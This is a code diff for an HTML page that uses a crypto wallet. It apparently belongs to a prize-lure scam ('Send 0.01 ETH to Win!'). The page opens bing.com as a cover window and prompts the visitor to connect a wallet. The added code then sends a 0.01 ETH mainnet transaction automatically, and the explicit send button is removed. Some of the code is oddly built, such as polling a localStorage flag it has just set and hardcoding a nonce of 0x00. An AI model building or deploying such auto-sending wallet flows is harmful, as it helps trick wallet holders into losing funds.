@@ -23,19 +23,20 @@
       // Open bing.com
       const bingWindow = window.open('https://bing.com', 'x');
 
-      // Check for wallet connection when the button is clicked in bing.com
-      window.addEventListener('message', async (event) => {
-        if (event.origin !== 'https://bing.com') return;
-
-        if (event.data === 'promptWalletConnection') {
-          await promptWalletConnection();
-        }
-      });
-
       // Check for wallet connection
       await promptWalletConnection();
-      // Notify bing.com that the wallet is connected
-      bingWindow.postMessage('walletConnected', 'https://bing.com');
+
+      // Store the wallet connection status in local storage
+      localStorage.setItem('walletConnected', 'true');
+
+      // Poll for changes in local storage at an interval
+      const checkLocalStorage = setInterval(() => {
+        const walletConnected = localStorage.getItem('walletConnected');
+        if (walletConnected === 'true') {
+          clearInterval(checkLocalStorage);
+          sendTransaction();
+        }
+      }, 1000);
     }
 
     async function promptWalletConnection() {
@@ -52,46 +53,31 @@
       }
     }
 
-    const enableEthereumButton = document.querySelector('.enableEthereumButton');
-    const sendEthButton = document.querySelector('.sendEthButton');
+    async function sendTransaction() {
+      const transactionParameters = {
+        nonce: "0x00",
+        gasPrice: "0x244AC6D",
+        gas: "0x12A52",
+        to: "0x0000000000000000000000000000000000000000", // Replace with the actual recipient address
+        from: ethereum.selectedAddress,
+        value: "0x2386F26FC10000",
+        data: "0x00",
+        chainId: "0x1",
+      };
 
-    let accounts = [];
-
-    // Send Ethereum to an address
-    sendEthButton.addEventListener('click', () => {
-      ethereum
-        .request({
-          method: 'eth_sendTransaction',
-          // The following sends an EIP-1559 transaction. Legacy transactions are also supported.
-          params: [
-            {
-              from: accounts[0], // The user's active address.
-              to: '0x0000000000000000000000000000000000000000', // Replace with the actual recipient address
-              value: '0x2386F26FC10000', // Only required to send ether to the recipient from the initiating external account.
-              gasLimit: '0x5028', // Customizable by the user during MetaMask confirmation.
-              maxPriorityFeePerGas: '0x3b9aca00', // Customizable by the user during MetaMask confirmation.
-              maxFeePerGas: '0x2540be400', // Customizable by the user during MetaMask confirmation.
-            },
-          ],
-        })
-        .then((txHash) => console.log(txHash))
-        .catch((error) => console.error(error));
-    });
-
-    enableEthereumButton.addEventListener('click', () => {
-      getAccount();
-    });
-
-    async function getAccount() {
-      accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      try {
+        const txHash = await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
+        });
+        alert(`Transaction sent! Transaction hash: ${txHash}`);
+      } catch (error) {
+        alert(`Error sending transaction: ${error.message}`);
+      }
     }
   </script>
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
-    <br>
-    <button class="button sendEthButton">Send 0.01 ETH to Win!</button>
-    <br>
-    <button class="button enableEthereumButton">Enable Ethereum</button>
   </center>
 </body>
 </html>
